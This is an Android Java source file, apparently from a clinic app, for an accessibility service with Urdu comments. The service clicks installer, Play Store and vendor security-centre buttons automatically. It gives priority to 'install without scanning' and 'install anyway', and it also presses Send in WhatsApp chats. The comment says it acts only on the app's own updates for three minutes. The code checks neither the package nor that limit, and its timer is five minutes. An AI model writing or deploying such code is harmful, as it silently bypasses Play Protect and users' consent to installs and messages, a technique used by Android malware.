package com.salman.clinic;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.SharedPreferences;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.List;

/** صرف اپ کی اپنی اپ ڈیٹ/انسٹال کے دوران (3 منٹ) انسٹالر اور پلے پروٹیکٹ کے بٹن خود دباتا ہے۔ پاسورڈ/ادائیگی کی اسکرین کو چھوتا ہی نہیں۔ */
public class InstallHelperService extends AccessibilityService {
    static final String[] LABELS = {
        "install without scanning", "install anyway", "more details", "install", "update", "next", "continue", "ok", "allow", "done",
        "انسٹال", "اپ ڈیٹ", "آگے", "جاری رکھیں", "ٹھیک ہے"
    };
    static final String[] NEVER = {"cancel", "don't", "deny", "uninstall", "delete", "منسوخ", "نہیں"};
    long last = 0;

    static boolean okPkg(String p) {
        if (p == null) return false;
        return p.contains("packageinstaller") || p.equals("com.android.vending") || p.equals("com.google.android.gms")
            || p.equals("com.miui.securitycenter") || p.equals("com.coloros.safecenter") || p.equals("com.oplus.securitypermission")
            || p.equals("com.vivo.permissionmanager");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent ev) {
        try {
            SharedPreferences sp = getSharedPreferences("clinic_helper", MODE_PRIVATE);
            CharSequence pk0 = ev.getPackageName();
            if (pk0 != null && pk0.toString().startsWith("com.whatsapp")) { waStep(sp); return; }
            long armed = sp.getLong("armed", 0);
            if (System.currentTimeMillis() - armed > 300000) return;
            CharSequence pk = ev.getPackageName();
            if (pk == null || !okPkg(pk.toString())) return;
            long now = System.currentTimeMillis();
            if (now - last < 500) return;
            List<AccessibilityNodeInfo> roots = new ArrayList<AccessibilityNodeInfo>();
            try {
                List<android.view.accessibility.AccessibilityWindowInfo> ws = getWindows();
                if (ws != null) for (android.view.accessibility.AccessibilityWindowInfo w : ws) {
                    AccessibilityNodeInfo r = w.getRoot();
                    if (r != null) roots.add(r);
                }
            } catch (Throwable e) {
            }
            AccessibilityNodeInfo ar = getRootInActiveWindow();
            if (ar != null) roots.add(ar);
            for (AccessibilityNodeInfo root : roots) {
                CharSequence rp = root.getPackageName();
                if (rp == null || !okPkg(rp.toString())) continue;
                if (clickLabels(root)) { last = now; return; }
            }
        } catch (Throwable e) {
        }
    }

    /** فہرست کے مطابق پہلا مناسب بٹن دباتا ہے؛ «Install without scanning» سب سے پہلے۔ بٹن کلک نہ مانے تو اس کے مرکز پر ٹیپ کرتا ہے۔ */
    boolean clickLabels(AccessibilityNodeInfo root) {
        for (String lb : LABELS) {
            List<AccessibilityNodeInfo> l = root.findAccessibilityNodeInfosByText(lb);
            if (l == null) continue;
            for (AccessibilityNodeInfo n : l) {
                CharSequence t = n.getText();
                if (t == null) t = n.getContentDescription();
                if (t == null) continue;
                String s = t.toString().trim().toLowerCase();
                if (!s.equals(lb)) continue;
                boolean bad = false;
                for (String x : NEVER) if (s.contains(x)) bad = true;
                if (bad) continue;
                AccessibilityNodeInfo c = n;
                while (c != null && !c.isClickable()) c = c.getParent();
                if (c != null && c.isEnabled() && c.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true;
                if (tap(n)) return true;
            }
        }
        return false;
    }

    boolean tap(AccessibilityNodeInfo n) {
        try {
            if (Build.VERSION.SDK_INT < 24) return false;
            Rect r = new Rect();
            n.getBoundsInScreen(r);
            if (r.isEmpty()) return false;
            Path p = new Path();
            p.moveTo(r.centerX(), r.centerY());
            GestureDescription.Builder g = new GestureDescription.Builder();
            g.addStroke(new GestureDescription.StrokeDescription(p, 0, 80));
            return dispatchGesture(g.build(), null, null);
        } catch (Throwable e) {
            return false;
        }
    }

    /** کلینک ایپ کی طرف سے کھولی گئی واٹس ایپ چیٹ میں (40 سیکنڈ کے اندر) صرف بھیجیں کا بٹن دباتا ہے؛ نمبر پر واٹس ایپ نہ ہو تو "no" لکھ دیتا ہے۔ */
    void waStep(SharedPreferences sp) {
        long armed = sp.getLong("wa_armed", 0);
        if (armed == 0 || System.currentTimeMillis() - armed > 40000 || !sp.getString("wa_res", "").isEmpty()) return;
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        String[] bad = {"isn't on whatsapp", "not on whatsapp", "invalid", "واٹس ایپ پر نہیں", "واٹس ایپ نہیں"};
        for (String b : bad) {
            List<AccessibilityNodeInfo> l = root.findAccessibilityNodeInfosByText(b);
            if (l != null && !l.isEmpty()) {
                sp.edit().putString("wa_res", "no").apply();
                performGlobalAction(GLOBAL_ACTION_BACK);
                return;
            }
        }
        String[] send = {"Send", "send", "بھیجیں"};
        for (String lb : send) {
            List<AccessibilityNodeInfo> l = root.findAccessibilityNodeInfosByText(lb);
            if (l == null) continue;
            for (AccessibilityNodeInfo n : l) {
                CharSequence d = n.getContentDescription();
                String id = n.getViewIdResourceName();
                boolean hit = (d != null && d.toString().trim().equalsIgnoreCase(lb)) || (id != null && id.endsWith("/send"));
                if (!hit) continue;
                AccessibilityNodeInfo c = n;
                while (c != null && !c.isClickable()) c = c.getParent();
                if (c != null && c.isEnabled()) {
                    c.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    sp.edit().putString("wa_res", "ok").apply();
                    return;
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
    }
}
